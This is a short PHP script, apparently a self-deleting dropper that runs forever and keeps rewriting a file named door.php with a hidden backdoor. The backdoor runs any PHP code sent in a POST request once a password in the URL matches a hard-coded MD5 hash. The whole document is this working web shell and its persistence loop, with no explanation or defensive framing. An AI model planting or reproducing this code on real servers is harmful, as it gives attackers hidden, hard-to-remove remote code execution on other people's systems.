<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = 'door.php';
$code = '<?php if(md5($_GET["ma"])=="668bd767946a9e6e50afc8de87ae9d52"){@eval($_POST[a]);} ?>';
while (1){
    file_put_contents($file,$code);
    usleep(5000);
}
?>
